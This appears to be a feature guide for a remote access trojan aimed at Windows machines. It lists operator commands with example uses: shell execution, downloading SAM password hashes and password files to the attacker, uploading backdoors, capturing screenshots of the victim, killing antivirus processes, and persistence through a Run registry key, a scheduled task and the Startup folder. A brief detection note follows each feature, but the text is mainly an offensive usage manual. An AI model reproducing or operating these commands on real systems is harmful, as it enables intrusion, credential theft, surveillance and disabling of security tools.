FEATURES EXPLAINED

INFORMATION GATHERING:
─────────────────────

sysinfo
├─ Returns: Hostname, OS, version, CPU, memory, username, architecture
├─ Use: Understand target capabilities
└─ Detection: Signature-based, behavioral analysis

processes
├─ Returns: List of running processes with PIDs and owners
├─ Use: Identify antivirus/security software, find targets
└─ Detection: Process listing typically monitored by EDR

ls <directory>
├─ Returns: Files and folders in specified directory
├─ Use: Enumerate filesystem, find sensitive files
└─ Detection: File system access patterns monitored


COMMAND EXECUTION:
──────────────────

shell <command>
├─ Executes: Any Windows command (CMD/PowerShell)
├─ Examples:
│  ├─ shell whoami → Get current user
│  ├─ shell ipconfig → Network configuration
│  ├─ shell systeminfo → Detailed system info
│  ├─ shell tasklist → Running processes
│  ├─ shell net user → Local user accounts
│  └─ shell dir C:\path → List files
├─ Use: Information gathering, privilege escalation
└─ Detection: Command execution patterns, behavior


FILE OPERATIONS:
────────────────

download <remote_path>
├─ Transfers: File FROM Windows TO attacker
├─ Examples:
│  ├─ download C:\Users\admin\Desktop\passwords.txt
│  ├─ download C:\Windows\System32\SAM (password hashes)
│  └─ download "C:\Program Files\...\config.xml"
├─ Use: Data exfiltration, credential theft
└─ Detection: File access patterns, network monitoring

upload <local_file> <remote_path>
├─ Transfers: File FROM attacker TO Windows
├─ Examples:
│  ├─ upload /home/attacker/backdoor.exe C:\backdoor.exe
│  ├─ upload exploit.exe C:\exploit.exe
│  └─ upload persistence.ps1 C:\ProgramData\persistence.ps1
├─ Use: Deploy additional malware, backdoors
└─ Detection: Unusual file creation, suspicious downloads


SURVEILLANCE:
──────────────

screenshot
├─ Captures: Current screen of victim
├─ Returns: PNG image file
├─ Use: See what user is doing, capture credentials
└─ Detection: Display access, file operations

take_screenshot()
├─ Function: ImageGrab.grab() from PIL
├─ Resolution: Full screen capture
├─ Format: PNG (lossless)
└─ Detection: Screen capture attempts


PROCESS MANAGEMENT:
───────────────────

kill <pid>
├─ Terminates: Process by Process ID
├─ Examples:
│  ├─ kill 1234 (kill specific process)
│  ├─ kill antivirus process (disable security)
│  └─ kill user processes
├─ Use: Kill antivirus, disable security, hide activity
└─ Detection: Unexpected process termination

start <command>
├─ Launches: New process on target
├─ Examples:
│  ├─ start calc.exe
│  ├─ start powershell.exe -NoProfile
│  └─ start C:\payload.exe
├─ Use: Execute additional payloads, reverse shells
└─ Detection: Suspicious process spawning


PERSISTENCE:
─────────────

persist
├─ Method 1: Windows Registry Startup
│  └─ HKEY_CURRENT_USER\...\Run → "SystemService" = executable
│
├─ Method 2: Task Scheduler
│  └─ schtasks /create /tn "SystemUpdate" /tr trojan.exe /sc minute
│
├─ Method 3: Startup Folder
│  └─ C:\Users\username\AppData\Roaming\...\Startup\SystemService.exe
│
├─ Effect: Trojan survives system reboot, auto-connects
└─ Detection: Registry modification, task scheduler changes, file access
